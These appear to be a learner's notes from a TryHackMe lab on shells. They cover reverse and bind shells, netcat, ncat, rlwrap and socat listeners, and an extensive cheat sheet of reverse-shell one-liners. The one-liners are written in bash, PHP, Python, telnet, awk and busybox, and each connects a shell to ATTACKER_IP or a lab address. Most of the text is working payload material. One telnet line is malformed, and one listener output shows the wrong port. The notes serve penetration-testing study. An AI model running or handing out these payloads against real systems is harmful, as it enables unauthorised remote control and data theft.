### What is a Shell?

A shell is software that allows a user to interact with an OS. It can be a graphical interface, but it is usually a command-line interface, and this will depend on the operating system running on the target system.
## What attackers can do with a shell

🖥️ ==`Remote System Control`== : Run commands or software on the target machine from afar.
 
⬆️ ==`Privilege Escalation`== : Upgrade from limited access (user) to higher access (admin/root).

📤 ==`Data Exfiltration`== : Search for, read, and copy sensitive files or data.

🔁 ==`Persistence`== : 

Maintain access by:  Creating users, Adding credentials ,Installing backdoors

🧪 ==`Post‑Exploitation`== : 

Perform actions after initial access, such as: Deploying malware, Creating hidden accounts ,Deleting logs or data

🌐 ==`Pivoting`== : Use the compromised system as a **launch point** to attack other systems on the same network.

---
# Reverse Shell

A reverse shell, sometimes referred to as a "connect back shell," is one of the most popular techniques for gaining access to a system in cyberattacks. The connections initiate from the target system to the attacker's machine, which can help avoid detection from network firewalls and other security appliances.

### ==`How Reverse Shells Work`==
#### **Set up a Netcat (nc) Listener**

As mentioned above, a reverse shell will connect back to the attacker's machine. This machine will be waiting for a connection, so let's use Netcat to listen to a connection using the following command `nc -lvnp 443`.  

```shell-session
attacker@kali:~$ nc -lvnp 443
listening on [any] 4444 ...
```

- `-l`: listen
- `-v`: verbose
- `-n`: no DNS (The `-n` option prevents the connections from using DNS for lookup, so it will not resolve any hostname it will use an IP address)
- `-p`: port
- Common ports (53, 80, 443, etc.) help blend with normal traffic.

As an example, let's analyze an example payload named a **pipe reverse shell**, as shown below.

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

- `rm -f /tmp/f` → Removes any existing pipe to avoid conflicts
- `mkfifo /tmp/f` → Creates a named pipe (FIFO) for two-way communication
- `cat /tmp/f` → Reads commands sent through the pipe
- `| sh -i 2>&1` → Executes commands in an interactive shell and sends errors + output
- `| nc ATTACKER_IP ATTACKER_PORT` → Sends shell I/O to attacker via Netcat
- `>/tmp/f` → Sends attacker input back into the pipe

##### **Attacker Receives the Shell**

Once the above payload is executed, the attacker will receive a **reverse shell**, as shown below, allowing them to execute commands as if they were logging into a regular terminal in the OS.

**Attacker Terminal Output (Receiving Shell)**
```shell-session
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
To run a command as administrator (user "root"), use "sudo ".
See "man sudo_root" for details.

target@tryhackme:~$
```

The output above shows the connection coming from the IP `10.10.13.37`, which is the IP address of the compromised target.
# Reverse Shell Cheat Sheet
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

---
# Bind Shell

As the name indicates, a bind shell will bind a port on the compromised system and listen for a connection; when this connection occurs, it exposes the shell session so the attacker can execute commands remotely.

- **Bind shell:** Target opens (binds) a port and listens; attacker connects to it to get a shell.
- **Use case:** When the target **cannot make outbound connections**.
- **Downside:** Easier to detect since it listens on an open port.

**Bind Shell Payload (run on target):**
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

- `rm -f /tmp/f` → Removes existing pipe
- `mkfifo /tmp/f` → Creates FIFO for two-way communication
- `cat /tmp/f` → Reads attacker input
- `| bash -i 2>&1` → Interactive shell with error/output redirection
- `| nc -l 0.0.0.0 8080` → Netcat listens on all interfaces, port 8080
- `>/tmp/f` → Sends output back into the pipe

> Ports **<1024 require root**, so 8080 avoids privilege issues.

**Attacker connects:**
```
nc -nv TARGET_IP 8080
```
- `-n` → No DNS
- `-v` → Verbose
- Connects to the listening bind shell

**Result:**  
Attacker gets an interactive shell on the target system.


![[Pasted image 20260211000917.png]]

---
# Shell Listeners

A **listener** waits for an incoming reverse shell connection and lets the attacker interact with it.
### **Netcat (basic)** :  Common, simple listener

```
nc -lvnp 443
```

- No line editing or history by default.

### **Rlwrap (Netcat enhancement)** : Adds **arrow keys, command history, and editing**.

```
rlwrap nc -lvnp 443
```

- Wraps Netcat for better shell usability.

### **Ncat (Netcat by Nmap)** :  More features, including **SSL encryption**.


**Basic listener:**
```
ncat -lvnp 4444
```

**SSL-encrypted listener:**
```
ncat --ssl -lvnp 4444
```

 `--ssl` encrypts the reverse shell traffic.

### **Socat** : Powerful tool for connecting data streams/sockets.

**Listener example:**
```
socat -d -d TCP-LISTEN:443 STDOUT
```

- `-d -d` → Increased verbosity
- `TCP-LISTEN:443` → Listen on port 443
- `STDOUT` → Output received data to terminal
---
# Shell Payloads

A Shell Payload can be a command or script that exposes the shell to an incoming connection in the case of a bind shell or a send connection in the case of a reverse shell.

Let's explore some of these payloads that can be used in the Linux OS to expose the shell through the most popular **reverse shell**.  

## ==`Bash`==

**Normal Bash Reverse Shell**
```shell-session
target@tryhackme:~$ bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1 
```
This reverse shell initiates an interactive bash shell that redirects input and output through a TCP connection to the attacker's IP (**ATTACKER_IP**) on port `443`. The `>&` operator combines both standard output and standard error.


**Bash Read Line** **Reverse Shell**
```shell-session
target@tryhackme:~$ exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done 
```
This reverse shell creates a new file descriptor (`5` in this case)  and connects to a TCP socket. It will read and execute commands from the socket, sending the output back through the same socket.


**Bash With File Descriptor 196** **Reverse Shell**
```shell-session
target@tryhackme:~$ 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196 
```
This reverse shell uses a file descriptor (`196` in this case) to establish a TCP connection. It allows the shell to read commands from the network and send output back through the same connection.

  

**Bash With File Descriptor 5** **Reverse Shell**
```shell-session
target@tryhackme:~$ bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```
Similar to the first example, this command opens a shell (`bash -i`), but it uses file descriptor `5` for input and output, enabling an interactive session over the TCP connection.

## ==`PHP`==

**PHP Reverse Shell Using the exec Function**
```shell-session
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");' 
```
This reverse shell creates a socket connection to the attacker's IP on port `443` and uses the `exec` function to execute a shell, redirecting standard input and output.


**PHP Reverse Shell Using the shell_exec Function**
```shell-session
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```
Similar to the previous command, but uses the `shell_exec` function.


**PHP Reverse Shell Using the system Function**
```shell-session
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");' 
```
This reverse shell employs the `system` function, which executes the command and outputs the result to the browser.


**PHP Reverse Shell Using the passthru Function**
```shell-session
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```
The `passthru` function executes a command and sends raw output back to the browser. This is useful when working with binary data.

  

**PHP Reverse Shell Using the popen Function**
```shell-session
target@tryhackme:~$ php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");' 
```
This reverse shell uses `popen` to open a process file pointer, allowing the shell to be executed.

## ==`Python`==

### ﻿Please note, the following snippets below require using `python -c` to run, indicated by the placeholder PY-C  

**Python Reverse Shell by Exporting Environment Variables**
```shell-session
target@tryhackme:~$ export RHOST="ATTACKER_IP"; export RPORT=443; PY-C 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")' 
```
This reverse shell sets the remote host and port as environment variables, creates a socket connection, and duplicates the socket file descriptor for standard input/output.


**Python Reverse Shell Using the subprocess Module**
```shell-session
target@tryhackme:~$ PY-C 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")' 
```
This reverse shell uses the `subprocess` module to spawn a shell and set up a similar environment as the Python Reverse Shell by Exporting Environment Variables command.  


**Short Python Reverse Shell**
```shell-session
PY-C 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
```
This reverse shell creates a socket (`s`), connects to the attacker, and redirects standard input, output, and error to the socket using `os.dup2()`.

## ==`Others`== 

**Telnet**
```shell-session
target@tryhackme:~$ TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP443 0<$TF | sh 1>$TF
```
This reverse shell creates a named pipe using `mkfifo` and connects to the attacker via Telnet on IP `ATTACKER_IP` and port `443`. 


**AWK**
```shell-session
target@tryhackme:~$ awk 'BEGIN {s = "/inet/tcp/0/ATTACKER_IP/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
This reverse shell uses AWK’s built-in TCP capabilities to connect to `ATTACKER_IP:443`. It reads commands from the attacker and executes them. Then it sends the results back over the same TCP connection.


**BusyBox**
```shell-session
target@tryhackme:~$ busybox nc ATTACKER_IP 443 -e sh
```
This BusyBox reverse shell uses Netcat (`nc`) to connect to the attacker at `ATTACKER_IP:443`. Once connected, it executes `/bin/sh`, exposing the command line to the attacker.